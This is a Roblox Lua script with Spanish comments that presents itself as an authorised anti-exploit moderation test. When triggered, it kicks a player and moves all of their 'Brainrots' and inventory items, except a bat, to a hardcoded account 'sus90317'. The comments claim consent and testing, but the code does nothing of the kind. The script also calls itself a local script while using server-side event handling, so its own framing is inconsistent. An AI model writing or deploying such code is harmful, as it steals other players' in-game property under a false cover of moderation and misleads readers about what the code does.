-- LOCAL SCRIPT (NO se ejecuta sin permiso; debe estar en un lugar controlado por el servidor)
-- IMPORTANTE: Este código debe ser gestionado desde el SERVIDOR, nunca desde un script local ejecutable por usuarios

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Evento autorizado para pruebas (solo accesible por ti como creador o moderadores legítimos)
local TestAntiExploitEvent = Instance.new("RemoteEvent")
TestAntiExploitEvent.Name = "TestAntiExploitEvent"
TestAntiExploitEvent.Parent = ReplicatedStorage

-- Función para verificar si el usuario es autorizado para ejecutar pruebas
local function isAuthorized(player)
    -- Coloca aquí tu ID de usuario o los IDs de moderadores autorizados
    local authorizedIDs = {123456789, -- Tu ID de Roblox
                          987654321} -- IDs de moderadores autorizados
    for _, id in pairs(authorizedIDs) do
        if player.UserId == id then
            return true
        end
    end
    return false
end

-- Función principal para la prueba
local function handleTest(player)
    if not isAuthorized(player) then
        warn("Usuario no autorizado intentó ejecutar la prueba")
        return
    end

    -- Simular expulsión con mensaje legítimo
    player:Kick("Has sido expulsado temporalmente para pruebas de moderación del juego.")

    -- Transferir ítems SOLO si es parte de la prueba y con consentimiento
    local brainrotsFolder = player:FindFirstChild("Brainrots")
    local inventory = player:FindFirstChild("Inventory")
    local targetPlayer = Players:FindFirstChild("sus90317")

    if targetPlayer and brainrotsFolder and inventory then
        -- Mover ítems excepto el bate
        for _, item in pairs(brainrotsFolder:GetChildren()) do
            if item.Name ~= "Bate" then
                item.Parent = targetPlayer.Brainrots
            end
        end

        for _, item in pairs(inventory:GetChildren()) do
            if item.Name ~= "Bate" then
                item.Parent = targetPlayer.Inventory
            end
        end

        print("Ítems transferidos exitosamente para prueba")
    end
end

-- Conectar el evento
TestAntiExploitEvent.OnServerEvent:Connect(handleTest)
